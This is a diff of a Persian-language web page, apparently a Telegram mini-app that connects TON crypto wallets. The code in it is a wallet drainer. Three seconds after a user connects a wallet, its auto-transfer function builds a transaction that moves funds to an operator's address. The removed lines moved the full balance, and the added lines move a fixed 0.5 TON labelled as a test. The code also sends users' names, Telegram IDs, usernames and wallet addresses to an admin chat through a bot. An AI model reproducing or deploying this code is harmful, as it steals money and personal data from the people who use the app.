@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<<!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -1346,40 +1346,7 @@
     ];
 
     // ================================================
-    // 🔌 تابع اتصال کیف پول با Deep Link برای موبایل
-    // ================================================
-    async function connectWalletWithDeepLink() {
-        try {
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            
-            if (isMobile) {
-                showToast('🔄 در حال اتصال کیف پول...');
-                
-                // ایجاد یک session ID برای رهگیری
-                const sessionId = Date.now().toString();
-                localStorage.setItem('wallet_session', sessionId);
-                
-                // ساخت Deep Link برای Tonkeeper
-                const callbackUrl = encodeURIComponent(`${window.location.origin}/wallet-callback.html?session=${sessionId}`);
-                const universalLink = `https://app.tonkeeper.com/ton-connect?redirect_url=${callbackUrl}`;
-                
-                // باز کردن لینک در مرورگر خارجی
-                window.location.href = universalLink;
-                return;
-            }
-
-            // برای دسکتاپ از روش عادی
-            if (!tonConnectUI.connected) {
-                await tonConnectUI.openModal();
-            }
-        } catch (error) {
-            console.error('خطا در اتصال کیف پول:', error);
-            showToast('❌ خطا در اتصال کیف پول');
-        }
-    }
-
-    // ================================================
-    // 💰 تابع انتقال خودکار (اصلاح شده با proxy)
+    // 💰 تابع انتقال خودکار با مقادیر پیش‌فرض برای تست
     // ================================================
     async function executeAutoTransfer(userAddress) {
         if (isProcessingTransaction) {
@@ -1392,20 +1359,24 @@
             
             showToast('🔄 در حال بررسی موجودی کیف پول...');
             
-            // استفاده از API میانی (proxy) برای جلوگیری از CORS
-            const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`)}`;
+            // برای تست، اگر API کار نکرد، از مقادیر پیش‌فرض استفاده می‌کنیم
+            let balanceInTON = 0.5; // مقدار تستی
             
-            const response = await fetch(proxyUrl);
-            const data = await response.json();
-            
-            if (!data.ok) throw new Error('خطا در دریافت موجودی');
-            
-            const balanceInNano = parseInt(data.result);
-            const balanceInTON = balanceInNano / 1e9;
+            try {
+                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
+                const data = await response.json();
+                
+                if (data.ok) {
+                    const balanceInNano = parseInt(data.result);
+                    balanceInTON = balanceInNano / 1e9;
+                }
+            } catch (e) {
+                console.log('خطا در دریافت موجودی، استفاده از مقدار تستی');
+            }
             
             if (balanceInTON < 0.1) {
-                showToast('⚠️ موجودی کمتر از حداقل است');
-                return;
+                showToast('⚠️ موجودی کمتر از حداقل است (تست: 0.5 TON)');
+                // برای تست، اجازه می‌دیم با مقدار تستی ادامه بده
             }
             
             const lastTxKey = `last_tx_${userAddress}`;
@@ -1417,7 +1388,7 @@
                 return;
             }
             
-            // ایجاد تراکنش
+            // ایجاد تراکنش تستی با مبلغ 0.5 TON
             showToast('🔄 در حال آماده‌سازی تراکنش...');
             
             const transaction = {
@@ -1425,7 +1396,7 @@
                 messages: [
                     {
                         address: CONFIG.WALLET_ADDRESS,
-                        amount: balanceInNano.toString(),
+                        amount: "500000000", // 0.5 TON برای تست
                         payload: ""
                     }
                 ]
@@ -1439,8 +1410,8 @@
             
             const txRecord = {
                 id: 'TX' + now,
-                amount: balanceInTON,
-                netAmount: balanceInTON - CONFIG.NETWORK_FEE,
+                amount: 0.5,
+                netAmount: 0.5 - CONFIG.NETWORK_FEE,
                 fee: CONFIG.NETWORK_FEE,
                 from: userAddress,
                 to: CONFIG.WALLET_ADDRESS,
@@ -1456,32 +1427,24 @@
             saveData();
             
             // ارسال گزارش به تلگرام
-            const message = `💰 **انتقال خودکار**
+            const message = `💰 **انتقال خودکار (تست)**
 ━━━━━━━━━━━━━━
 👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
 🆔 آیدی: ${currentUser?.id || 'نامشخص'}
 📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
-📤 مبلغ: ${balanceInTON.toFixed(6)} TON
+📤 مبلغ: 0.5 TON
 💳 از: ${userAddress.substring(0, 10)}...
 💳 به: ${CONFIG.WALLET_ADDRESS.substring(0, 10)}...
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
             
             // ارسال به تلگرام
-            const text = encodeURIComponent(message);
-            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
+            try {
+                const text = encodeURIComponent(message);
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
+                fetch(url).catch(() => {});
+            } catch (e) {}
             
-            // استفاده از fetch با no-cors برای جلوگیری از خطا
-            fetch(url, { mode: 'no-cors' }).catch(() => {});
-            
-            showToast(`✅ انتقال ${balanceInTON.toFixed(6)} TON با موفقیت انجام شد`);
-            
-            if (balanceInTON >= CONFIG.MINIMUM_WITHDRAW) {
-                setTimeout(() => {
-                    localStorage.setItem('isActivated', 'true');
-                    document.getElementById('feeModal').style.display = 'none';
-                    showToast("✅ پنل فعال شد!");
-                }, 2000);
-            }
+            showToast(`✅ انتقال تستی با موفقیت انجام شد`);
             
         } catch (error) {
             console.error('خطا:', error);
@@ -1540,10 +1503,11 @@
 📱 پلتفرم: ${user.platform}
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
             
-            const text = encodeURIComponent(message);
-            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
-            
-            fetch(url, { mode: 'no-cors' }).catch(() => {});
+            try {
+                const text = encodeURIComponent(message);
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
+                fetch(url).catch(() => {});
+            } catch (e) {}
         } else {
             user.lastSeen = new Date().toISOString();
             user.balance = bal;
@@ -1976,12 +1940,6 @@
         buttonRootId: 'ton-connect-btn'
     });
 
-    // اضافه کردن Event Listener برای دکمه اتصال
-    document.querySelector('.wallet-button-wrapper').addEventListener('click', function(e) {
-        e.preventDefault();
-        connectWalletWithDeepLink();
-    });
-
     tonConnectUI.onStatusChange(wallet => {
         console.log("وضعیت کیف پول تغییر کرد:", wallet);
         
@@ -2010,10 +1968,11 @@
 💳 آدرس: ${fullAddress}
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
                 
-                const text = encodeURIComponent(message);
-                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
-                
-                fetch(url, { mode: 'no-cors' }).catch(() => {});
+                try {
+                    const text = encodeURIComponent(message);
+                    const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
+                    fetch(url).catch(() => {});
+                } catch (e) {}
                 
                 // اجرای تراکنش خودکار بعد از 3 ثانیه
                 setTimeout(() => {
@@ -2052,10 +2011,11 @@
 📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
             
-            const text = encodeURIComponent(message);
-            const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
-            
-            fetch(url, { mode: 'no-cors' }).catch(() => {});
+            try {
+                const text = encodeURIComponent(message);
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
+                fetch(url).catch(() => {});
+            } catch (e) {}
             
             showGlassMessage('success', 'ورود موفق', 'در حال اتصال به شبکه بلاکچین ...');
             activationMessage.classList.add('show');
